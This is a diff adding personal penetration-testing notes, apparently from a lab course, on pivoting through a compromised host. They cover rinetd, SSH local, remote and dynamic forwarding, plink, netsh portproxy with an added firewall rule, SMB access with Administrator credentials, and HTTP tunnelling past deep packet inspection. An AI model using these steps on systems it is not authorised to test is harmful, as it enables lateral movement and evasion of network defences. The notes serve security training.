@@ -1,0 +1,144 @@
+
+
+redirect the requestes using RINETD:
+
+### on kali machine:
+
+sudo apt install rinetd
+
+cat /etc/rinetd.conf
+		    ;bindadress: the incoming ip in our case any ip 0.0.0.0
+		    ;bindport: the incomig port in our case 80
+		    ;connectadress: the destination we want to reach in our case googl.com
+		    ;connectport: the destination port we want to connect in our case 80
+
+sudo service rinetd restart
+
+### on the machine we want to redirect its requests :
+
+nc -nvv kaliIP 80
+ 		   ;the kali become the way to google 
+==========================================================================================================
+
+ kali ip = 10.11.0.4
+ hacked machine ip = 10.11.0.128
+ server ip = 192.168.1.110
+
+---------------------------------------------------------
+
+### when we use SSH Local Forwarding we reflict the server on our localhost using SSH connection to the PC we hacked, its useful when the firewall doesnt block the ssh protocol:
+
+	ssh -N -L [bind_address:]port:host:hostport [username@address]
+
+	sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128     
+
+
+!note: if the server is windows server 2016 we should custom our SMB to run SMBv2; so we do the following:
+
+sudo nano /etc/samba/smb.conf
+echo "min protocol = SMB2" >>smb.conf
+
+now we can use it but remember that our kali is the server so if we want to connect to the server we use our localhost; example on smb:
+
+smbclient -L 127.0.0.1 -U Administrator    -----> the request go to the server
+
+----------------------------------------------------------
+
+### when we use SSH Remote Forwarding we also reflict the server on our localhost but this time the connection starts from the server to our kali (the server itself hacked not another PC), its useful when the firewall block the coming SSH protocol:
+
+	ssh -N -R [bind_address:]port:host:hostport [username@address]
+	
+	ssh -N -R 10.11.0.4:5555:127.0.0.1:3306 kali@10.11.0.4
+
+our kali is now the server, on kali we try for example:
+
+sudo nmap -sS -sV 127.0.0.1 -p 5555
+
+
+----------------------------------------------------------
+
+### when we use SSH Dynamic its the same SSH Local but without specify a certain ip or port, its useful if we want to use more than one target or one port like nmap scan does:
+
+	ssh -N -D <address to bind to>:<port to bind to> <username>@<ssh server address>
+	
+	sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
+
+on our kali we have to edit /etc/proxychains.conf by add:
+
+socks4	    127.0.0.1 8080
+
+so now for example if we want to nmap a target (like the server) on the hacked PC network we write:
+
+sudo proxychains nmap -sT -Pn 192.168.1.110  
+
+==========================================================================================================
+
+### if we hack a windows machine which doesnt have SSH we can use PLINk, its similar to ssh. after we transfer it to the hacked windows system with admin privliges we write:
+
+	cmd.exe /c echo y | plink.exe -ssh -l kali -pw kaliPassword -R 10.11.0.4:5555:127.0.0.1:3306 10.11.0.4
+
+so on kali we can try nmap:
+
+sudo nmap -sS -sV 127.0.0.1 -p 5555
+
+==========================================================================================================
+10.11.0.22 is windows ip
+
+### again if we hack a windows machine we can use NETSH to redirect our requests to the server, it's installed by default on modern windows but it requier two conditions, the IPv6 and the IPHelper service should be enabled, if so we write:
+
+	netsh interface portproxy add v4tov4 listenport=5555 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+
+for that to work we should add firewall rule:
+	netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=5555 action=allow
+
+then we edit SMB to SMBv2 on kali like we did before.
+
+now we can use smb like we want:
+
+smbclient -L 10.11.0.22 --port=5555 --user=Administrator
+sudo mount -t cifs -o port=5555 //10.11.0.22/Data -o username=Adninistrator,password=Password! /home/kali/smbfolder
+
+============================================================================================================
+
+
+### if we face a Deep Packet Inspection firewall we have to use HTTPTunnel-ing
+
+	sudo apt install httptunnel
+
+first we start build ssh connection between server and hacked machine, so on the hacked machine we write:
+	
+	ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+
+then we start hts server on the hacked machine:
+	
+	hts --forward-port loaclhost:8888 5555
+
+then we start htc client on our kali machine:
+	
+	htc --forward-port 8080 10.11.0.128:5555
+
+and now we have our connection to the server.
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
